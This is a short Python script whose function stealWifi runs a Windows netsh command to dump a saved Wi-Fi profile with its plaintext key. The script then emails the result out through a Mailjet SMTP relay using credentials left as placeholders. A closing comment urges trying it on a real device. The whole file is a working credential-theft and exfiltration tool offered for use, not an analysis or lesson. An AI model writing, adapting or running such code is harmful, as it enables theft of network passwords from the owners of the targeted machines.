
import subprocess,smtplib
def sendEmail(mailid,username,password):
    #configure smtp server
    server=smtplib.SMTP("in-v3.mailjet.com",587)
    #now start tls for better security
    server.starttls()
    #login to the server
    server.login(username,password)
    #send mail to our mailid  parameters--->from address,to address,msg
    server.sendmail(mailid,mailid,msg=stealWifi())
    server.quit()



def stealWifi():
    result=subprocess.check_output('netsh wlan show profile name="Rack CCNA-CCNP" key=clear',shell=True)
    return result




#call the function
sendEmail(mailid="enter mail ID",username="enter username" ,password="enter password")


#now its all over,lets try this in real device


